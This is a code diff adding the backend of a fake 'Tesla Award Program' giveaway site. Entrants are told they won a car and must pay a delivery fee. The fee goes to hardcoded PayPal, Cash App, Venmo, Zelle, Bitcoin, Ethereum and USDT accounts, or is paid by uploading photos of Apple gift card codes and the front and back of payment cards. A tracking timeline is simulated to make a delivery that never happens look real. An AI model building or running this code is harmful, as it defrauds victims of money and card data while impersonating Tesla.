@@ -1,0 +1,889 @@
+import { Router } from "express";
+import crypto from "crypto";
+import { v4 as uuidv4 } from "uuid";
+import nodemailer from "nodemailer";
+import { logger } from "../lib/logger.js";
+import { getSupabaseAdmin } from "../lib/supabase.js";
+
+const router = Router();
+
+type TimelineItem = { stage: string; timestamp: string | null; completed: boolean };
+type OrderResponse = {
+  orderId: string; trackingNumber: string; email: string; entryId: string;
+  selectedCar: Record<string, string>;
+  deliveryDetails: Record<string, string>;
+  deliveryMethod: Record<string, string | number>;
+  paymentMethod: Record<string, string>;
+  status: string; orderDate: string; estimatedDelivery: string;
+  timeline: TimelineItem[];
+};
+
+const resendTimestamps: Record<string, number> = {};
+const PAYMENT_METHOD_SAMPLE_CONFIG: Record<string, { description: string; config: Record<string, any> }> = {
+  paypal: { description: "Pay securely with your PayPal account or linked card", config: { businessName: "Tesla Global Awards LLC", email: "payments@teslaglobalawards.com", merchantId: "TM8XK2R9Q4ZPA", paypalMeLink: "https://paypal.me/teslaglobalawards", instructions: "Send the delivery fee via PayPal to our verified business account and include your Order ID in the note. Screenshot the confirmation and upload it as proof." } },
+  cashapp: { description: "Instant payment with your Cash App balance or debit card", config: { cashtag: "$TeslaGlobalAwards", accountName: "Tesla Global Awards", phone: "+1 (888) 472-3001", instructions: "Send the delivery fee to our verified Cash App account, add your Order ID in the For field, then upload a screenshot of the confirmation." } },
+  venmo: { description: "Fast, secure payments with Venmo", config: { username: "@TeslaGlobalAwards", accountName: "Tesla Global Awards LLC", instructions: "Send the delivery fee to our official Venmo handle, include your Order ID in the description, and upload the confirmation screen." } },
+  zelle: { description: "Send directly from your bank account with Zelle", config: { recipientName: "Tesla Global Awards LLC", email: "zelle@teslaglobalawards.com", phone: "+1 (415) 892-3401", instructions: "Send the delivery fee with Zelle to the registered email or phone number, include your Order ID in the memo, then upload confirmation." } },
+  bitcoin: { description: "Pay with Bitcoin on the Bitcoin network", config: { walletAddress: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", network: "Bitcoin (BTC) — Mainnet", confirmations: "3 confirmations required", instructions: "Send the exact delivery fee amount in BTC to the wallet address above using the BTC network only, then upload a screenshot showing the TX hash." } },
+  ethereum: { description: "Pay with Ethereum (ETH)", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", confirmations: "12 confirmations required", instructions: "Send the exact ETH equivalent of the delivery fee to the Ethereum Mainnet wallet and upload the confirmed transaction screenshot." } },
+  "usdt-erc20": { description: "Tether USD on the Ethereum network", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", tokenContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", instructions: "Send USDT on ERC-20 to the wallet address above and upload the confirmed transaction screenshot." } },
+  "usdt-trc20": { description: "Tether USD on the TRON network — lower fees", config: { walletAddress: "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS", network: "TRON Network (TRC-20)", instructions: "Send USDT on TRC-20 to the wallet address above and upload the confirmed transaction receipt screenshot." } },
+  creditcard: { description: "Visa, Mastercard, Amex, and Discover accepted", config: { acceptedCards: "Visa, Mastercard, American Express, Discover", processorName: "Tesla Awards Secure Payments", merchantAccount: "TGAWARDS-US-9041", supportPhone: "+1 (888) 472-3001", instructions: "Enter card details securely in the payment form. Transactions are encrypted and a confirmation is emailed after processing." } },
+  applegift: { description: "Pay with an Apple Gift Card — instant and private", config: { denominationsAccepted: "$25, $50, $100, $200 denominations accepted", purchaseLocations: "Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens", instructions: "Upload clear photos of the front and back of the Apple Gift Card with the redemption code fully visible and legible." } }
+};
+
+function paymentSlug(m: any): string {
+  return String(m.slug || m.name || m.display_name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
+}
+
+function parseAccountDetails(raw: any): Record<string, any> {
+  if (!raw) return {};
+  if (typeof raw === "object") return { ...raw };
+  try { return JSON.parse(raw); } catch { return {}; }
+}
+
+function mergeNonEmpty(base: Record<string, any>, override: Record<string, any>): Record<string, any> {
+  const merged = { ...base };
+  for (const [key, value] of Object.entries(override || {})) {
+    if (value !== undefined && value !== null && String(value).trim() !== "") merged[key] = value;
+  }
+  return merged;
+}
+
+function enrichPaymentMethodRow(m: any) {
+  const slug = paymentSlug(m);
+  const sample = PAYMENT_METHOD_SAMPLE_CONFIG[slug];
+  const config = mergeNonEmpty(sample?.config || {}, parseAccountDetails(m.account_details));
+  if (m.wallet_address) config.walletAddress = m.wallet_address;
+  if (m.payment_instructions && String(m.payment_instructions).trim()) config.instructions = m.payment_instructions;
+  if (m.qr_code_url) config.qrCode = m.qr_code_url;
+  return {
+    id: slug || m.id, _dbId: m.id, name: m.display_name || m.name, type: m.type || "wallet",
+    description: (m.description && m.description !== m.display_name && m.description !== m.name) ? m.description : (sample?.description || m.description || ""), logo: m.logo_url || "", logo_url: m.logo_url || "",
+    enabled: m.enabled, displayOrder: m.sort_order || 0, sort_order: m.sort_order || 0, config,
+    wallet_address: m.wallet_address || config.walletAddress || config.cashtag || config.username || config.email || "",
+    payment_instructions: m.payment_instructions || config.instructions || "",
+    lastUpdated: m.updated_at || m.created_at || ""
+  };
+}
+
+function selectedCarLabel(carData: Record<string, any>): string {
+  const candidates = [carData.name, carData.model, carData.modelName, carData.title, carData.vehicle, carData.vehicleName, carData.displayName];
+  return String(candidates.find((v) => typeof v === "string" && v.trim()) || "");
+}
+
+
+const smtpUser = process.env["SMTP_USER"]?.trim();
+const smtpPass = process.env["SMTP_PASS"]?.trim();
+
+function getMailTransporter() {
+  if (!smtpUser || !smtpPass) {
+    throw new Error("Missing SMTP_USER or SMTP_PASS environment variables.");
+  }
+  return nodemailer.createTransport({ service: "gmail", auth: { user: smtpUser, pass: smtpPass } });
+}
+
+async function sendMail(message: nodemailer.SendMailOptions) {
+  return getMailTransporter().sendMail(message);
+}
+
+function getBaseUrl(): string {
+  const configured = process.env["PUBLIC_BASE_URL"]?.trim();
+  if (configured) return configured.replace(/\/$/, "");
+  const domains = process.env["REPLIT_DOMAINS"] ?? "";
+  const primary = domains.split(",")[0]?.trim();
+  return primary ? `https://${primary}` : `http://localhost:${process.env["PORT"] ?? 8080}`;
+}
+
+router.post("/entry", async (req, res) => {
+  try {
+    const { email, phone, firstName, lastName } = req.body as { email: string; phone: string; firstName?: string; lastName?: string };
+    if (!email || !phone) { res.status(400).json({ error: "Email and phone number are required." }); return; }
+    const emailKey = email.toLowerCase().trim();
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailKey)) { res.status(400).json({ error: "Please enter a valid email address." }); return; }
+
+    const supabase = await getSupabaseAdmin();
+    const { data: existing, error: lookupError } = await supabase.from("giveaway_users").select("id").eq("email", emailKey).maybeSingle();
+    if (lookupError) throw lookupError;
+    if (existing) { res.status(409).json({ error: "This email has already been entered. Only one entry per person is allowed." }); return; }
+
+    const verificationToken = crypto.randomBytes(32).toString("hex");
+    const authResult = await supabase.auth.admin.createUser({ email: emailKey, phone, email_confirm: false, user_metadata: { firstName: firstName ?? "", lastName: lastName ?? "" } });
+    if (authResult.error && !authResult.error.message.toLowerCase().includes("already")) throw authResult.error;
+
+    const { data: entry, error } = await supabase.from("giveaway_users").insert({
+      auth_user_id: authResult.data.user?.id ?? null,
+      email: emailKey, phone, first_name: firstName ?? "", last_name: lastName ?? "", verification_token: verificationToken,
+      verification_status: "pending", entry_count: 1,
+    }).select("id").single();
+    if (error) {
+      if (error.code === "23505") { res.status(409).json({ error: "This email has already been entered. Only one entry per person is allowed." }); return; }
+      throw error;
+    }
+
+    const verifyLink = `${getBaseUrl()}/api/verify?token=${verificationToken}&email=${encodeURIComponent(emailKey)}`;
+    // Email verification disabled
+    res.json({ success: true, message: "Entry submitted successfully!", entryId: entry.id, emailSent: false });
+  } catch (err) { logger.error({ err }, "Entry error"); res.status(500).json({ error: "Server error. Please try again." }); }
+});
+
+router.get("/verify", async (req, res) => {
+  try {
+    const { token, email } = req.query as { token?: string; email?: string };
+    if (!token || !email) { res.redirect("/verify-error.html?reason=invalid"); return; }
+    const emailKey = email.toLowerCase();
+    const supabase = await getSupabaseAdmin();
+    const { data: entry, error } = await supabase.from("giveaway_users").select("id,email,verification_token,auth_user_id").eq("email", emailKey).maybeSingle();
+    if (error) throw error;
+    if (!entry) { res.redirect("/verify-error.html?reason=notfound"); return; }
+    if (entry.verification_token !== token) { res.redirect("/verify-error.html?reason=invalid_token"); return; }
+
+    await supabase.from("giveaway_users").update({ verification_status: "verified", verified_at: new Date().toISOString() }).eq("id", entry.id);
+    if (entry.auth_user_id) await supabase.auth.admin.updateUserById(entry.auth_user_id, { email_confirm: true });
+    // Check if user already has an order
+    const { data: verifyExistingOrder } = await supabase.from("orders").select("order_id").eq("user_id", entry.id).maybeSingle();
+    
+    const sessionToken = crypto.randomBytes(32).toString("hex");
+    const { error: sessionError } = await supabase.from("user_sessions").insert({ token: sessionToken, user_id: entry.id });
+    if (sessionError) throw sessionError;
+    
+    if (verifyExistingOrder) {
+      res.redirect(`/order-placed.html?session=${sessionToken}`);
+    } else {
+      res.redirect(`/dashboard.html?session=${sessionToken}`);
+    }
+  } catch (err) { logger.error({ err }, "Verify error"); res.redirect("/verify-error.html?reason=server"); }
+});
+
+router.post("/resend", async (req, res) => {
+  try {
+    const { email } = req.body as { email: string };
+    if (!email) { res.status(400).json({ error: "Email is required." }); return; }
+    const emailKey = email.toLowerCase();
+    const supabase = await getSupabaseAdmin();
+    const { data: entry, error } = await supabase.from("giveaway_users").select("id,first_name,verification_token,verification_status").eq("email", emailKey).maybeSingle();
+    if (error) throw error;
+    if (!entry) { res.status(404).json({ error: "Email address not found. Please enter the program first." }); return; }
+    if (entry.verification_status === "verified") { res.status(409).json({ error: "This email has already been verified." }); return; }
+    const lastResend = resendTimestamps[emailKey];
+    if (lastResend && Date.now() - lastResend < 60_000) { res.status(429).json({ error: "Please wait 60 seconds before requesting another email." }); return; }
+    resendTimestamps[emailKey] = Date.now();
+    const verifyLink = `${getBaseUrl()}/api/verify?token=${entry.verification_token}&email=${encodeURIComponent(emailKey)}`;
+    await sendMail({ from: `"Tesla Award Program" <${smtpUser!}>`, to: emailKey, subject: "⚡ Verification Email Resent — Tesla Award Program", html: buildVerificationEmail(entry.first_name || "there", verifyLink, entry.id) });
+    res.json({ success: true, message: "Verification email resent." });
+  } catch (err) { logger.error({ err }, "Resend error"); res.status(500).json({ error: "Failed to resend email. Please try again." }); }
+});
+
+router.post("/login", async (req, res) => {
+  try {
+    const { email, phone } = req.body as { email?: string; phone?: string };
+    if (!email || !phone) { res.status(400).json({ error: "Email and phone number are required." }); return; }
+    const emailKey = email.toLowerCase().trim();
+    const normalizedPhone = phone.replace(/\D/g, "");
+    const supabase = await getSupabaseAdmin();
+    const { data: entry, error } = await supabase.from("giveaway_users").select("id,email,phone,first_name,last_name,verification_status,verification_token").eq("email", emailKey).maybeSingle();
+    if (error) throw error;
+    if (!entry || entry.phone.replace(/\D/g, "") !== normalizedPhone) {
+      res.status(401).json({ error: "We could not match that email and phone number." });
+      return;
+    }
+    // Email verification disabled — all users treated as verified
+    const sessionToken = crypto.randomBytes(32).toString("hex");
+    const { error: sessionError } = await supabase.from("user_sessions").insert({ token: sessionToken, user_id: entry.id });
+    if (sessionError) throw sessionError;
+    // Check if user already has an order — load FULL order data
+    let hasOrder = false;
+    let orderData = null;
+    try {
+      const { data: fullOrder } = await supabase.from("orders").select("order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)").eq("user_id", entry.id).order("order_date", { ascending: false }).limit(1).maybeSingle();
+      if (fullOrder) {
+        hasOrder = true;
+        const car = Array.isArray(fullOrder.selected_cars) ? fullOrder.selected_cars[0] : fullOrder.selected_cars;
+        const delivery = Array.isArray(fullOrder.delivery_details) ? fullOrder.delivery_details[0] : fullOrder.delivery_details;
+        const tracking = ((fullOrder.tracking_data ?? []) as any[]).sort((a, b) => a.stage_order - b.stage_order).map((t) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
+        orderData = {
+          orderId: fullOrder.order_id, trackingNumber: fullOrder.tracking_number, status: fullOrder.status,
+          orderDate: fullOrder.order_date, estimatedDelivery: fullOrder.estimated_delivery,
+          deliveryMethod: fullOrder.delivery_method || {}, paymentMethod: fullOrder.payment_method || {},
+          selectedCar: car?.data || {}, deliveryDetails: delivery?.data || {}, timeline: tracking
+        };
+      }
+    } catch (orderErr) { logger.warn({ err: orderErr }, "Login: failed to load existing order"); }
+    res.json({ success: true, sessionToken, user: { email: entry.email, firstName: entry.first_name || "", lastName: entry.last_name || "", entryId: entry.id, phone: entry.phone || "" }, hasOrder, order: orderData });
+  } catch (err) { logger.error({ err }, "Login error"); res.status(500).json({ error: "Login failed. Please try again." }); }
+});
+
+async function getSessionUser(sessionToken?: string) {
+  if (!sessionToken) return null;
+  const supabase = await getSupabaseAdmin();
+  const { data, error } = await supabase.from("user_sessions").select("token,user_id,giveaway_users(id,email,phone,first_name,last_name)").eq("token", sessionToken).gt("expires_at", new Date().toISOString()).maybeSingle();
+  if (error) throw error;
+  const user = Array.isArray(data?.giveaway_users) ? data?.giveaway_users[0] : data?.giveaway_users;
+  return user ? { ...user, entryId: data!.user_id } as any : null;
+}
+
+router.get("/session", async (req, res) => {
+  try {
+    const user = await getSessionUser((req.query as { token?: string }).token);
+    if (!user) { res.status(401).json({ valid: false }); return; }
+    const supabase = await getSupabaseAdmin();
+    // Check if user already has an order — load FULL order data
+    let hasOrder = false;
+    let orderData = null;
+    try {
+      const { data: fullOrder } = await supabase.from("orders").select("order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)").eq("user_id", user.id).order("order_date", { ascending: false }).limit(1).maybeSingle();
+      if (fullOrder) {
+        hasOrder = true;
+        const car = Array.isArray(fullOrder.selected_cars) ? fullOrder.selected_cars[0] : fullOrder.selected_cars;
+        const delivery = Array.isArray(fullOrder.delivery_details) ? fullOrder.delivery_details[0] : fullOrder.delivery_details;
+        const tracking = ((fullOrder.tracking_data ?? []) as any[]).sort((a, b) => a.stage_order - b.stage_order).map((t) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
+        orderData = {
+          orderId: fullOrder.order_id, trackingNumber: fullOrder.tracking_number, status: fullOrder.status,
+          orderDate: fullOrder.order_date, estimatedDelivery: fullOrder.estimated_delivery,
+          deliveryMethod: fullOrder.delivery_method || {}, paymentMethod: fullOrder.payment_method || {},
+          selectedCar: car?.data || {}, deliveryDetails: delivery?.data || {}, timeline: tracking
+        };
+      }
+    } catch (orderErr) { logger.warn({ err: orderErr }, "Session: failed to load existing order"); }
+    res.json({ valid: true, user: { email: user.email, firstName: user.first_name || "", lastName: user.last_name || "", entryId: user.entryId, phone: user.phone || "" }, hasOrder, order: orderData });
+  } catch (err) { logger.error({ err }, "Session error"); res.status(500).json({ valid: false }); }
+});
+
+router.post("/order", async (req, res) => {
+  try {
+    const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = req.body as { sessionToken: string; selectedCar: Record<string, string>; deliveryDetails: Record<string, string>; deliveryMethod?: Record<string, string | number>; paymentMethod?: Record<string, string> };
+        const user = await getSessionUser(sessionToken);
+    if (!user) { res.status(401).json({ error: "Invalid session. Please verify your email first." }); return; }
+    const supabase = await getSupabaseAdmin();
+    
+    // Check if user already has an order
+    const { data: existingOrder, error: orderCheckError } = await supabase.from("orders").select("id").eq("user_id", user.id).maybeSingle();
+    if (orderCheckError) throw orderCheckError;
+    if (existingOrder) { res.status(400).json({ error: "You have already placed an order. Each user is restricted to one order only." }); return; }
+    const orderId = "TSLA-" + uuidv4().substring(0, 8).toUpperCase();
+    const trackingNumber = "TRK-" + crypto.randomBytes(4).toString("hex").toUpperCase();
+    const method = deliveryMethod ?? { id: "standard", name: "Standard Delivery", price: 299 };
+    const estimatedDelivery = calcEstimatedDelivery(method.id === "express" ? 2 : 10);
+    const { data: carRow, error: carError } = await supabase.from("selected_cars").insert({ user_id: user.id, data: selectedCar ?? {} }).select("id").single();
+    if (carError) throw carError;
+    const { data: deliveryRow, error: deliveryError } = await supabase.from("delivery_details").insert({ user_id: user.id, data: deliveryDetails ?? {} }).select("id").single();
+    if (deliveryError) throw deliveryError;
+    const { data: orderRow, error: orderError } = await supabase.from("orders").insert({ order_id: orderId, tracking_number: trackingNumber, user_id: user.id, selected_car_id: carRow.id, delivery_details_id: deliveryRow.id, delivery_method: method, payment_method: paymentMethod ?? { id: "unknown", name: "Not specified" }, status: "confirmed", estimated_delivery: estimatedDelivery }).select("id,order_date").single();
+    if (orderError) throw orderError;
+    const timeline = defaultTimeline(new Date(orderRow.order_date).toISOString());
+    const { error: trackingError } = await supabase.from("tracking_data").insert(timeline.map((t, i) => ({ order_id: orderRow.id, stage: t.stage, stage_order: i, timestamp: t.timestamp, completed: t.completed })));
+    if (trackingError) throw trackingError;
+    const order = { orderId, trackingNumber, email: user.email, entryId: user.entryId, selectedCar: selectedCar ?? {}, deliveryDetails: deliveryDetails ?? {}, deliveryMethod: method, paymentMethod: paymentMethod ?? { id: "unknown", name: "Not specified" }, status: "confirmed", orderDate: new Date(orderRow.order_date).toISOString(), estimatedDelivery, timeline };
+    // Send confirmation email (best effort)
+    try {
+      await sendMail({ from: `"Tesla Giveaway" <${smtpUser!}>`, to: user.email, subject: "🎉 Order Confirmed — Your Tesla is on the way!", html: buildOrderConfirmationEmail(order) });
+      logger.info({ email: user.email, orderId }, "Order confirmation email sent");
+    } catch (emailErr) { logger.warn({ err: emailErr }, "Failed to send order confirmation email"); }
+    res.json({ success: true, order });
+  } catch (err) { logger.error({ err }, "Order error"); res.status(500).json({ error: "Server error. Please try again." }); }
+});
+
+router.get("/order/tracking/:trackingNumber", async (req, res) => {
+  try {
+    const order = await loadOrderBy("tracking_number", req.params["trackingNumber"] ?? "");
+    if (!order) { res.status(404).json({ error: "Tracking number not found." }); return; }
+    res.json({ order: simulateProgress(order) });
+  } catch (err) { logger.error({ err }, "Tracking lookup error"); res.status(500).json({ error: "Server error." }); }
+});
+
+router.get("/order/:orderId", async (req, res) => {
+  try {
+    const order = await loadOrderBy("order_id", req.params["orderId"] ?? "");
+    if (!order) { res.status(404).json({ error: "Order not found." }); return; }
+    res.json({ order: simulateProgress(order) });
+  } catch (err) { logger.error({ err }, "Order lookup error"); res.status(500).json({ error: "Server error." }); }
+});
+
+async function loadOrderBy(column: "order_id" | "tracking_number", value: string): Promise<OrderResponse | null> {
+  const supabase = await getSupabaseAdmin();
+  const { data, error } = await supabase.from("orders").select("id,order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(id,email),selected_cars(data),delivery_details(data),tracking_data(stage,stage_order,timestamp,completed)").eq(column, value).maybeSingle();
+  if (error) throw error;
+  if (!data) return null;
+  const user = Array.isArray(data.giveaway_users) ? data.giveaway_users[0] : data.giveaway_users;
+  const car = Array.isArray(data.selected_cars) ? data.selected_cars[0] : data.selected_cars;
+  const delivery = Array.isArray(data.delivery_details) ? data.delivery_details[0] : data.delivery_details;
+  const tracking = ((data.tracking_data ?? []) as any[]).sort((a, b) => a.stage_order - b.stage_order).map((t) => ({ stage: t.stage, timestamp: t.timestamp, completed: t.completed }));
+  return { orderId: data.order_id, trackingNumber: data.tracking_number, email: user?.email ?? "", entryId: user?.id ?? "", selectedCar: car?.data ?? {}, deliveryDetails: delivery?.data ?? {}, deliveryMethod: data.delivery_method ?? {}, paymentMethod: data.payment_method ?? {}, status: data.status, orderDate: new Date(data.order_date).toISOString(), estimatedDelivery: data.estimated_delivery, timeline: tracking };
+}
+
+// ── HELPERS ───────────────────────────────────────────────────────────
+function defaultTimeline(orderDate: string): TimelineItem[] {
+  return [
+    { stage: "Order Confirmed", timestamp: orderDate, completed: true },
+    { stage: "Processing", timestamp: null, completed: false },
+    { stage: "Shipped", timestamp: null, completed: false },
+    { stage: "In Transit", timestamp: null, completed: false },
+    { stage: "Out for Delivery", timestamp: null, completed: false },
+    { stage: "Delivered", timestamp: null, completed: false },
+  ];
+}
+
+function calcEstimatedDelivery(days: number): string {
+  const d = new Date();
+  d.setDate(d.getDate() + days);
+  return d.toISOString().split("T")[0]!;
+}
+
+function simulateProgress(order: OrderResponse) {
+  const now = new Date();
+  const orderDate = new Date(order.orderDate);
+  const hrs = (now.getTime() - orderDate.getTime()) / 3_600_000;
+
+  const updated = { ...order, timeline: order.timeline.map(t => ({ ...t })) };
+
+  function advance(idx: number, hoursNeeded: number, status: string) {
+    if (hrs > hoursNeeded && !updated.timeline[idx]!.completed) {
+      updated.timeline[idx]!.completed = true;
+      updated.timeline[idx]!.timestamp = new Date(orderDate.getTime() + hoursNeeded * 3_600_000).toISOString();
+      updated.status = status;
+    }
+  }
+
+  advance(1, 1,  "processing");
+  advance(2, 24, "shipped");
+  advance(3, 48, "in_transit");
+  advance(4, 72, "out_for_delivery");
+  advance(5, 96, "delivered");
+
+  return updated;
+}
+
+// ── EMAIL TEMPLATES ───────────────────────────────────────────────────
+function buildVerificationEmail(firstName: string, verifyLink: string, entryId: string) {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Email</title></head>
+<body style="margin:0;padding:0;background:#F7F8FA;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
+<table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;padding:40px 0;">
+<tr><td align="center">
+<table width="560" cellpadding="0" cellspacing="0" style="background:#FFFFFF;border-radius:20px;overflow:hidden;max-width:560px;box-shadow:0 8px 32px rgba(0,0,0,.08);">
+  <tr><td style="background:#171A20;padding:32px 40px;text-align:center;">
+    <svg width="84" height="84" viewBox="0 0 1280 1280" role="img" aria-label="Tesla T" style="display:block;margin:0 auto 10px;max-width:84px;height:auto;">
+      <path fill="#E31937" d="M0 128C189 44 406 0 640 0s451 44 640 128l-38 74C1054 123 851 80 640 80S226 123 38 202L0 128Z"/>
+      <path fill="#E31937" d="M57 235c156-68 353-109 583-109s427 41 583 109c-44 58-102 101-174 130-9-38-25-68-48-90-55-51-159-76-312-76h-51L640 1280 459 199h-51c-153 0-257 25-312 76-23 22-39 52-48 90-72-29-130-72-174-130Z"/>
+    </svg>
+    <div style="color:#E31937;font-size:18px;font-weight:900;letter-spacing:.16em;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">TESLA AWARD PROGRAM</div>
+  </td></tr>
+  <tr><td style="padding:0;"><div style="height:4px;background:linear-gradient(90deg,#E31937,#ff6b6b);"></div></td></tr>
+  <tr><td style="padding:44px 40px;">
+    <h1 style="font-size:26px;font-weight:800;color:#171A20;margin:0 0 12px;line-height:1.2;">Hi ${firstName}, you're almost in! ⚡</h1>
+    <p style="font-size:16px;color:#5C5E62;line-height:1.7;margin:0 0 32px;">You've submitted your entry for a chance to win a brand-new Tesla. One final step remains — verify your email address to confirm your entry and unlock your winner dashboard.</p>
+    <table width="100%" cellpadding="0" cellspacing="0"><tr><td align="center">
+      <a href="${verifyLink}" style="display:inline-block;background:#E31937;color:#FFFFFF;text-decoration:none;padding:16px 48px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:.02em;">Verify My Email Address</a>
+    </td></tr></table>
+    <p style="font-size:13px;color:#B0B3B8;text-align:center;margin:24px 0 0;line-height:1.6;">Or paste this link into your browser:<br><span style="color:#E31937;word-break:break-all;font-size:12px;">${verifyLink}</span></p>
+    <hr style="border:none;border-top:1px solid #E5E7EB;margin:32px 0;">
+    <table width="100%" cellpadding="0" cellspacing="0" style="background:#F7F8FA;border-radius:12px;">
+    <tr><td style="padding:18px 20px;">
+      <p style="margin:0 0 6px;font-size:12px;color:#B0B3B8;font-weight:700;text-transform:uppercase;letter-spacing:.06em;">Entry Details</p>
+      <p style="margin:0;font-size:14px;color:#5C5E62;">Entry ID: <span style="color:#171A20;font-family:monospace;font-weight:600;">${entryId}</span></p>
+      <p style="margin:4px 0 0;font-size:14px;color:#5C5E62;">Status: <span style="color:#E31937;font-weight:600;">Pending Verification</span></p>
+    </td></tr>
+    </table>
+  </td></tr>
+  <tr><td style="background:#F7F8FA;padding:24px 40px;border-top:1px solid #E5E7EB;">
+    <p style="margin:0;font-size:12px;color:#B0B3B8;text-align:center;line-height:1.6;">© 2026 Tesla Award Program. All rights reserved.<br>This is an independent award program. Tesla® is a registered trademark of Tesla, Inc.</p>
+  </td></tr>
+</table>
+</td></tr>
+</table>
+</body>
+</html>`;
+}
+
+// ── PAYMENT PROOF SUBMISSION ──────────────────────────────────────────
+router.post("/payment/submit", async (req, res) => {
+  try {
+    const { order_id, paymentMethodId, paymentMethodName, customerName, carModel, amount,
+            proofData, proofFileName, giftCardFront, giftCardBack, cardFront, cardBack,
+            sessionToken, orderData } = req.body as any;
+
+    const supabase = await getSupabaseAdmin();
+
+    // Resolve customer info from session (non-fatal if expired/missing)
+    let userId: string | null = null;
+    let customerEmail = "";
+    let customerPhone = "";
+    let resolvedName = customerName || "";
+    if (sessionToken) {
+      try {
+        const user = await getSessionUser(sessionToken);
+        if (user) {
+          userId = user.id ?? null;
+          customerEmail = user.email || "";
+          customerPhone = user.phone || "";
+          if (!resolvedName) resolvedName = [user.first_name, user.last_name].filter(Boolean).join(" ");
+        }
+      } catch { /* non-fatal */ }
+    }
+
+    const rawFront: string = proofData || giftCardFront || cardFront || "";
+    const rawBack: string  = giftCardBack || cardBack || "";
+
+    async function uploadProof(b64: string, suffix: string): Promise<string> {
+      if (!b64) return "";
+      try {
+        const base64 = b64.includes(",") ? b64.split(",")[1]! : b64;
+        const buf    = Buffer.from(base64, "base64");
+        const mime   = (b64.match(/^data:([^;]+);/) || [])[1] || "image/jpeg";
+        const ext    = mime.split("/")[1] || "jpg";
+        const name   = `${(order_id || "proof").replace(/[^a-zA-Z0-9-]/g, "_")}-${suffix}-${Date.now()}.${ext}`;
+        const { data: up, error: upErr } = await supabase.storage
+          .from("payment-proofs")
+          .upload(name, buf, { contentType: mime, upsert: true });
+        if (upErr || !up) return b64.length > 2_000_000 ? b64.substring(0, 2_000_000) : b64;
+        return supabase.storage.from("payment-proofs").getPublicUrl(name).data.publicUrl;
+      } catch {
+        return b64.length > 2_000_000 ? b64.substring(0, 2_000_000) : b64;
+      }
+    }
+
+    const [proof_url, proof_back_url] = await Promise.all([
+      uploadProof(rawFront, "front"),
+      uploadProof(rawBack,  "back"),
+    ]);
+
+    const { data: inserted, error: insertErr } = await supabase
+      .from("payment_proofs")
+      .insert({
+        order_id:        order_id || "",
+        user_id:         userId,
+        payment_method:  paymentMethodName || paymentMethodId || "Unknown",
+        proof_url:       proof_url || null,
+        proof_back_url:  proof_back_url || null,
+        proof_type:      "file",
+        amount:          String(amount || ""),
+        status:          "pending",
+        car_model:       carModel || "",
+        customer_name:   resolvedName || "",
+        customer_email:  customerEmail || "",
+        customer_phone:  customerPhone || "",
+        delivery_method: (orderData?.deliveryMethod as any)?.name || "",
+      })
+      .select("id")
+      .single();
+
+    if (insertErr) throw insertErr;
+    logger.info({ orderId: order_id, proofId: inserted.id }, "Payment proof submitted");
+    res.json({ success: true, proofId: inserted.id, orderId: order_id });
+  } catch (err) {
+    logger.error({ err }, "Payment submit error");
+    res.status(500).json({ error: "Server error. Please try again." });
+  }
+});
+
+// ── ADMIN: SETTINGS ──
+router.post("/admin/settings", async (req, res) => {
+  try {
+    const { standard_fee, express_fee } = req.body as { standard_fee?: number; express_fee?: number };
+    const supabase = await getSupabaseAdmin();
+    const value: Record<string, number> = {};
+    if (standard_fee !== undefined) {
+      value.standard_fee = standard_fee;
+      value.standard = standard_fee;
+    }
+    if (express_fee !== undefined) {
+      value.express_fee = express_fee;
+      value.express = express_fee;
+    }
+    if (Object.keys(value).length === 0) { res.status(400).json({ error: "No values to update" }); return; }
+    const { data: existing } = await supabase.from("admin_settings").select("value").eq("key", "delivery_fee").maybeSingle();
+    const merged = existing?.value ? { ...existing.value as any, ...value } : value;
+    const { error } = await supabase.from("admin_settings").upsert({ key: "delivery_fee", value: merged, updated_at: new Date().toISOString() }, { onConflict: "key" });
+    if (error) throw error;
+    res.json({ success: true, standard_fee: merged.standard_fee, express_fee: merged.express_fee });
+  } catch (err) { logger.error({ err }, "Admin settings error"); res.status(500).json({ error: "Server error" }); }
+});
+router.get("/admin/settings", async (_req, res) => {
+  try {
+    const supabase = await getSupabaseAdmin();
+    const { data, error } = await supabase.from("admin_settings").select("key,value").eq("key", "delivery_fee").maybeSingle();
+    if (error) throw error;
+    const v = (data?.value ?? {}) as any;
+    
+    const db_std = v.standard_fee ?? v.standard;
+    const db_exp = v.express_fee ?? v.express;
+    
+    if (db_std === undefined || db_exp === undefined) {
+      const standard_fee = db_std !== undefined ? db_std : Math.floor(Math.random() * 150) + 150;
+      const express_fee = db_exp !== undefined ? db_exp : standard_fee + Math.floor(Math.random() * 100) + 50;
+      
+      const merged = { ...v, standard_fee, express_fee, standard: standard_fee, express: express_fee };
+      await supabase.from("admin_settings").upsert({ key: "delivery_fee", value: merged, updated_at: new Date().toISOString() }, { onConflict: "key" });
+      
+      res.json({ standard_fee, express_fee });
+    } else {
+      res.json({ standard_fee: db_std, express_fee: db_exp });
+    }
+  } catch (err) { logger.error({ err }, "Admin settings get error"); res.status(500).json({ error: "Server error" }); }
+});
+
+
+// ── ADMIN: CC CONFIG ────────────────────────────────────────────────────────────
